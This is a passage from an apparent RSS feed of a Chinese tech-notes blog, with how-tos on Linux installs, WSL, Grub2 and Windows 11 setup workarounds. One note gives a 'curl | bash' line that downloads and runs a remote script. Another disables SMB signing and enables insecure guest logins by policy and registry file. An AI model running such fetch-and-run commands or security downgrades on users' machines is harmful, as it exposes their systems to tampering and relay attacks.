<p>开机后，进入Systemback的Live恢复模式页面，出现乱码界面时可直接按回车进入Live模式的Ubuntu系统。</p>
<p></p>
</li>
<li>
<p>在应用程序中找到Systemback，打开并选择“系统安装”。</p>
<p></p>
</li>
<li>
<p>输入新系统的用户名、密码和主机名，点击下一步。</p>
<p></p>
</li>
<li>
<p>在系统安装页面，需对硬盘进行分区配置。</p>
<p></p>
</li>
</ol>
<h4>分区设置</h4>
<p>推荐设置4个分区：“/”（ext4）、“/home”（ext4）、“swap”和“/boot/efi”。</p>
<ul>
<li><strong>swap</strong>：大小与内存相当（一般4GB）</li>
<li><strong>/boot</strong>：200MB至500MB</li>
<li><strong>/</strong>：建议分配30GB以上的空间</li>
<li><strong>/home</strong>：剩余空间，用于用户数据</li>
</ul>
<ol>
<li>
<p>先删除已有分区。</p>
<p></p>
</li>
<li>
<p>依次创建<code>/</code>（ext4）、<code>/home</code>（ext4）、<code>swap</code>、<code>/boot/efi</code> 4个分区。</p>
<p></p>
</li>
<li>
<p>完成分区挂载。</p>
<p></p>
<p></p>
<p></p>
</li>
</ol>
<p>挂载完成后，勾选“传递用户配置文件及用户数据”，点击“下一步”开始安装系统。</p>
<p></p>
<h3>安装完成后</h3>
<ol>
<li>安装完成后，重启主机。</li>
<li>在BIOS中将启动磁盘改回主机硬盘，进入系统。</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>Windows11的24H2出现扩展错误</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows11%E7%9A%8424H2%E5%87%BA%E7%8E%B0%E6%89%A9%E5%B1%95%E9%94%99%E8%AF%AF.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows11%E7%9A%8424H2%E5%87%BA%E7%8E%B0%E6%89%A9%E5%B1%95%E9%94%99%E8%AF%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows11的24H2出现扩展错误</source>
      <description>Windows11的24H2出现扩展错误 原因 默认SMB签名要求：为了提高安全性，防止网络篡改和中继攻击，默认所有连接都需要SMB签名。 禁用来宾登录：为了提升连接到不可信设备时的安全性，Windows 11 24H2 专业版及后续版本中禁用了不安全的来宾登录。 解决方案 79490a2342343d81f46f9e0a4a5cf85a 可以通过调整...</description>
      <pubDate>Mon, 14 Oct 2024 08:31:23 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>原因</h2>
<blockquote>
<ul>
<li><strong>默认SMB签名要求</strong>：为了提高安全性，防止网络篡改和中继攻击，默认所有连接都需要SMB签名。</li>
<li><strong>禁用来宾登录</strong>：为了提升连接到不可信设备时的安全性，Windows 11 24H2 专业版及后续版本中禁用了不安全的来宾登录。</li>
</ul>
</blockquote>
<h2>解决方案</h2>
<p></p>
<p>可以通过调整组策略或直接修改注册表来解决问题。</p>
<h3>方法1：通过组策略调整</h3>
<h4><strong>禁用SMB客户端签名要求</strong></h4>
<ul>
<li>打开“开始”菜单，搜索并启动“编辑组策略”(gpedit) 应用。</li>
<li>导航至：“计算机配置” &gt; “Windows 设置” &gt; “安全设置” &gt; “本地策略” &gt; “安全选项”。</li>
<li>双击“Microsoft网络客户端：对通信进行数字签名（始终）”。</li>
<li>选择“已禁用”，点击“确定”。</li>
</ul>
<h4><strong>启用不安全的来宾登录</strong></h4>
<ul>
<li>在“开始”菜单搜索中输入 gpedit 并启动“编辑组策略”应用。</li>
<li>导航至：“计算机配置” &gt; “管理模板” &gt; “网络” &gt; “Lanman 工作站”。</li>
<li>双击“启用不安全的来宾登录”。</li>
<li>选择“已启用”，点击“确定”。</li>
</ul>
<p>完成上述步骤后，请重启计算机以使更改生效。</p>
<h3>方法2：通过注册表修改</h3>
<p>创建一个名为“<a href="./Windows11%E7%9A%8424H2%E5%87%BA%E7%8E%B0%E6%89%A9%E5%B1%95%E9%94%99%E8%AF%AF.assets/%E4%BF%AE%E5%A4%8D%E5%85%B1%E4%BA%AB%E7%AD%BE%E5%90%8D%E8%AE%A4%E8%AF%81.reg">修复共享签名认证.reg</a>”的文件，内容如下, 已经编译好了，点击可下载：</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Windows Registry Editor Version 5.00</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters]</span></span>
<span class="line"><span>"RequireSecuritySignature"=dword:00000000</span></span>
<span class="line"><span>"AllowInsecureGuestAuth"=dword:00000001</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>保存该文件后，双击运行，然后按照提示操作，重启计算机以应用更改。</p>
]]></content:encoded>
    </item>
    <item>
      <title>CentOS 7 一键设置Vault镜像</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/RedHatEnterpriseLinux/CentOS7%E4%B8%80%E9%94%AE%E8%AE%BE%E7%BD%AEVault%E9%95%9C%E5%83%8F.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/RedHatEnterpriseLinux/CentOS7%E4%B8%80%E9%94%AE%E8%AE%BE%E7%BD%AEVault%E9%95%9C%E5%83%8F.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CentOS 7 一键设置Vault镜像</source>
      <description>CentOS 7 一键设置Vault镜像 为了方便，已经书写为脚本，一键设置镜像加速。早就写好了，为了下次再用，记录一下脚本吧。 一键设置</description>
      <pubDate>Sun, 13 Oct 2024 06:30:22 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>为了方便，已经书写为脚本，一键设置镜像加速。早就写好了，为了下次再用，记录一下脚本吧。</p>
</blockquote>
<h2>一键设置</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/yum/clean_and_set_mirror_centos7.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Fossy平台离线部署分析</title>
      <link>https://www.geekery.cn/note-book/Fossology/Fossy%E5%B9%B3%E5%8F%B0%E7%A6%BB%E7%BA%BF%E9%83%A8%E7%BD%B2%E5%88%86%E6%9E%90.html</link>
      <guid>https://www.geekery.cn/note-book/Fossology/Fossy%E5%B9%B3%E5%8F%B0%E7%A6%BB%E7%BA%BF%E9%83%A8%E7%BD%B2%E5%88%86%E6%9E%90.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Fossy平台离线部署分析</source>
      <description>Fossy平台离线部署分析 压缩包上传检测方法 image-20241010154938422 下载报告 经过测试DEP5更直观。 image-20241010155049729 可否离线工作 一些官方未修复bug的解决方法 scancode /root/.cache Permission denied 解决方法 在官方的文件基础上增加环境变量</description>
      <pubDate>Fri, 11 Oct 2024 01:42:26 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>压缩包上传检测方法</h2>
<p></p>
<h2>下载报告</h2>
<p>经过测试DEP5更直观。</p>
<p></p>
<h2>可否离线工作</h2>
<p>| 组件名称                            | 离线工作状态 | 功能描述                                                     | 问题描述                                                    | 备注                                                    |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>在WSL中移除Windows环境变量</title>
      <link>https://www.geekery.cn/note-book/WSL/%E5%9C%A8WSL%E4%B8%AD%E7%A7%BB%E9%99%A4Windows%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.html</link>
      <guid>https://www.geekery.cn/note-book/WSL/%E5%9C%A8WSL%E4%B8%AD%E7%A7%BB%E9%99%A4Windows%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.html</guid>
      <source url="https://www.geekery.cn/rss.xml">在WSL中移除Windows环境变量</source>
      <description>在WSL中移除Windows环境变量 在 WSL (Windows Subsystem for Linux) 中使用一个不包含 Windows 环境变量的更干净环境时，可以通过配置 /etc/wsl.conf 文件来实现。 步骤 1: 创建并编辑 /etc/wsl.conf 编辑 /etc/wsl.conf 文件： 如果文件不存在，需要创建它。 使用 ...</description>
      <pubDate>Thu, 10 Oct 2024 02:50:05 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在 WSL (Windows Subsystem for Linux) 中使用一个不包含 Windows 环境变量的更干净环境时，可以通过配置 <code>/etc/wsl.conf</code> 文件来实现。</p>
<h2>步骤 1: 创建并编辑 <code>/etc/wsl.conf</code></h2>
<ol>
<li>
<p><strong>编辑 <code>/etc/wsl.conf</code> 文件</strong>：</p>
<ul>
<li>
<p>如果文件不存在，需要创建它。</p>
</li>
<li>
<p>使用 <code>vim</code> 编辑器编辑文件：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/wsl.conf</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
</ul>
</li>
<li>
<p><strong>添加以下内容</strong>到文件中以禁用自动追加 Windows 路径到 WSL 的 PATH 变量：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[interop]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">appendWindowsPath</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> false</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>保存并关闭文件</strong>：</p>
<ul>
<li>在 <code>vim</code> 中，按 <code>Esc</code> 键进入正常模式。</li>
<li>输入 <code>:wq</code> 并按 <code>Enter</code> 键保存并退出。</li>
</ul>
</li>
</ol>
<h2>步骤 2: 重启 WSL</h2>
<ol>
<li>
<p><strong>在 PowerShell 或 CMD 中执行命令</strong>来终止特定的 WSL 发行版。将 <code>&lt;distro&gt;</code> 替换为您实际使用的发行版名称，如 <code>Ubuntu-20.04</code>：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">wsl </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">--</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">terminate &lt;distro&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
<li>
<p><strong>重新启动 WSL</strong>：再次打开您的 WSL 发行版，这次它不会自动附加 Windows 的 PATH 环境变量了。</p>
</li>
</ol>
<h2>注意事项</h2>
<ul>
<li>修改 <code>/etc/wsl.conf</code> 后，仅对新启动的 WSL 会话生效。</li>
<li>如果您在多个发行版中都需要这个设置，需要在每个发行版中分别进行配置。</li>
</ul>
<h2>参考文献</h2>
<ul>
<li><a href="https://github.com/microsoft/WSL/issues?q=is%3Aissue+is%3Aopen+label%3Aarea%2Fconfiguration" target="_blank" rel="noopener noreferrer">GitHub Issue 关于 WSL 的讨论</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Grub2手动引导Linux</title>
      <link>https://www.geekery.cn/note-book/GRUB/Grub2%E6%89%8B%E5%8A%A8%E5%BC%95%E5%AF%BCLinux.html</link>
      <guid>https://www.geekery.cn/note-book/GRUB/Grub2%E6%89%8B%E5%8A%A8%E5%BC%95%E5%AF%BCLinux.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Grub2手动引导Linux</source>
      <description>Grub2手动引导Linux 仅需以下四个步骤完成手动引导： 设置根分区 hd* 表示系统所在的磁盘，编号从0开始。 gpt* 指的是磁盘的分区表格式，其中 * 是具体的分区号。如果使用的是MBR分区表，则应写作 msdos*。 加载内核 第一个参数 /boot/vmlinux* 指向内核文件。 后面接的是内核启动参数，至少需要指定文件系统所在的磁盘和...</description>
      <pubDate>Wed, 09 Oct 2024 06:06:00 GMT</pubDate>
      <content:encoded><![CDATA[
<p>仅需以下四个步骤完成手动引导：</p>
<h2><strong>设置根分区</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hd*,gpt*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li><code>hd*</code> 表示系统所在的磁盘，编号从0开始。</li>
<li><code>gpt*</code> 指的是磁盘的分区表格式，其中 <code>*</code> 是具体的分区号。如果使用的是MBR分区表，则应写作 <code>msdos*</code>。</li>
</ul>
<h2><strong>加载内核</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">linux</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot/vmlinux</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root=/dev/sd</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">x</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li>第一个参数 <code>/boot/vmlinux*</code> 指向内核文件。</li>
<li>后面接的是内核启动参数，至少需要指定文件系统所在的磁盘和分区，如 <code>root=/dev/sd*x</code>。</li>
</ul>
<h2><strong>加载初始RAM磁盘（可选）</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">initrd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /boot/initrd</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li>指定启动过程中使用的初始RAM磁盘映像。在某些情况下，这一步可以省略。</li>
</ul>
<h2><strong>启动系统</strong></h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">boot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>提示</strong>：</p>
<ul>
<li>Grub2 支持使用Tab键进行自动补全，当您在输入命令时不确定具体的磁盘分区或文件路径，可以通过按Tab键来获取可能的选项列表，帮助您快速准确地完成输入。</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Windows11跳过TPM2.0和微软账号登录</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows11%E8%B7%B3%E8%BF%87TPM2.0%E5%92%8C%E5%BE%AE%E8%BD%AF%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows11%E8%B7%B3%E8%BF%87TPM2.0%E5%92%8C%E5%BE%AE%E8%BD%AF%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows11跳过TPM2.0和微软账号登录</source>
      <description>Windows11跳过TPM2.0和微软账号登录 绕过 TPM2.0 设置区域、时间和输入法 image-20250407172536520 绕过 TPM 这一步是关键，不要点击“现在安装” 按 Shift+F10 呼出命令提示符输入以下命令添加注册表键值。这一步是通过修改注册表绕过 TPM 检查继续安装系统。如果不绕过 TPM 检查则无法安装 Win...</description>
      <pubDate>Thu, 26 Sep 2024 05:42:40 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>绕过 TPM2.0</h2>
<h3>设置区域、时间和输入法</h3>
<p></p>
<h3>绕过 TPM</h3>
<p>这一步是关键，不要点击“现在安装” 按 Shift+F10 呼出命令提示符输入以下命令添加注册表键值。这一步是通过修改注册表绕过 TPM  检查继续安装系统。如果不绕过 TPM 检查则无法安装 Windows 11 会提示“这台电脑无法运行 Windows 11”</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>REG ADD HKLM\SYSTEM\Setup\LabConfig /v BypassTPMCheck /t REG_DWORD /d 1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h3>许可条款</h3>
<p>出现许可条款则说明已经绕过了 TPM 检查；</p>
<p></p>
<h2>跳过微软账户登录</h2>
<h3>方式一</h3>
<blockquote>
<p>适用于24年6月之前的Windows 系统</p>
</blockquote>
<p>在安装win11系统，进行到选择语言界面的时候，暂停下。</p>
<p>我们可以按下键盘的Shift+F10按键（部分电脑是Fn+Shift+F10），这时屏幕会出现命令行窗口。</p>
<p>我们需要在命令行内输入代码<strong>oobe\bypassnro.cmd</strong>然后回车，这时候电脑会重启。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">oobe\bypassnro.cmd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>PS：若无法输入命令，可以电脑插入鼠标点击一下命令行窗口（看到窗口外框变黑）再尝试。</p>
<p>我们就可以选择 我没有Internet链接 这个选项了（此时计算机如果插着网线正在联网的话需要先把网线拔掉才能有此选项）</p>
<p></p>
<h3>方式二</h3>
<blockquote>
<p>适用于24年新版系统安装Windows 11跳过微软账户</p>
</blockquote>
<h4>新建用户</h4>
<p>Shift + F10 打开cmd， 不需要任何操作</p>
<p>Win + R 然后输入 Control 调出 控制面板</p>
<p>在用户账户界面新建账户，该账户用于以后登陆</p>
<h4>修改注册表</h4>
<p>Win+R 输入regedit.exe 调出注册表编辑器</p>
<p></p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：BypassNRO，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：HideEULAPage，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：HideLocalAccountScreen，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：HideOEMRegistrationScreen，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：HideOnlineAccountScreens，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：HideWirelessSetuplnOOBE，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：SkipMachineOOBE，将值设置为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 新建DWORD（32位）值，名称为：SkipUserOOBE，将值设置为1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>重启电脑并禁用无用账户</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">禁用如下账户</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Administrator</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">default0</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">...</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 只留下你自己建立的账户就行</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Windows绕过MicroSoft Store直接下载应用</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows%E7%BB%95%E8%BF%87MicroSoft%20Store%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%BA%94%E7%94%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows%E7%BB%95%E8%BF%87MicroSoft%20Store%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%BA%94%E7%94%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows绕过MicroSoft Store直接下载应用</source>
      <description>Windows绕过MicroSoft Store直接下载应用 https://zhuanlan.zhihu.com/p/631642243 在浏览器打开微软商店（Microsoft 应用程序），搜索所需要的应用，复制应用的Url链接 img 打开这个网站Microsoft Store - Generation Project ，在输入框黏贴复制的链接，...</description>
      <pubDate>Mon, 23 Sep 2024 06:25:43 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>https://zhuanlan.zhihu.com/p/631642243</p>
</blockquote>
<p>在浏览器打开微软商店（<a href="https://apps.microsoft.com/store/apps" target="_blank" rel="noopener noreferrer">Microsoft 应用程序</a>），搜索所需要的应用，复制应用的Url链接</p>
<p></p>
<p>打开这个网站<a href="https://store.rg-adguard.net/" target="_blank" rel="noopener noreferrer">Microsoft Store - Generation Project </a> ，在输入框黏贴复制的链接，点击 <strong>√</strong>（查询）。</p>
<p>出来查询结果，找到后缀为（appxBundle）的进行<strong>下载</strong>（记住这个文件保存的位置）。</p>
<p></p>
<p>在win11或win10的【设置】里面，找到开发人员选项，打开"允许任意（外部）安装应用"。</p>
<p></p>
<p>打开Windows PowerShell对刚刚下载的包进行安装</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># 命令</span></span>
<span class="line"><span>Add-AppxPackage -Path "下载的包绝对路径"</span></span>
<span class="line"><span># 示例</span></span>
<span class="line"><span>Add-AppxPackage -Path "C:\temp\Microsoft.HEIFImageExtension_1.0.61171.0_neutral_~_8wekyb3d8bbwe.AppxBundle"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>The end。</p>
]]></content:encoded>
    </item>
    <item>
      <title>重装MicroSoft Store</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E4%BE%9D%E8%B5%96%E7%9A%84%E6%A1%86%E6%9E%B6%E4%B8%A2%E5%A4%B1-%E9%87%8D%E8%A3%85MicroSoft%20Store.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E4%BE%9D%E8%B5%96%E7%9A%84%E6%A1%86%E6%9E%B6%E4%B8%A2%E5%A4%B1-%E9%87%8D%E8%A3%85MicroSoft%20Store.html</guid>
      <source url="https://www.geekery.cn/rss.xml">重装MicroSoft Store</source>
      <description>重装MicroSoft Store 起因 我再安装iCloud Windows版本却怎么也安装不上，报错是WindowsAppRuntime没有安装，我从Windows官方安装了最新版Runtime后仍然无法安装，于是最后的解决方法是重装Windows 应用商店。 以管理员身份打开 PowerShell 按 Win + X 键，选择“Windows P...</description>
      <pubDate>Mon, 23 Sep 2024 05:54:27 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>起因</h2>
<p>我再安装iCloud Windows版本却怎么也安装不上，报错是WindowsAppRuntime没有安装，我从Windows官方安装了最新版Runtime后仍然无法安装，于是最后的解决方法是重装Windows 应用商店。</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">PS C:\windows\system32&gt; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Add-AppxPackage</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Path C:\Users\xxxxx\Downloads\AppleInc.iCloud_15.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2.157</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.0_x64__nzyj5cx40ttqa.Appx</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Add-AppxPackage</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> : 部署失败，原因是 HRESULT: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0x80073CF3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, 包无法进行更新、相关性或冲突验证。</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Windows 无法安装程序包 AppleInc.iCloud_15.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2.157</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.0_x64__nzyj5cx40ttqa，因为此程序包依赖于一个找不到的框架。请随要安装的</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">此程序包一起提供由</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">“CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US”</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">发布的框架</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">“Micro</span></span>
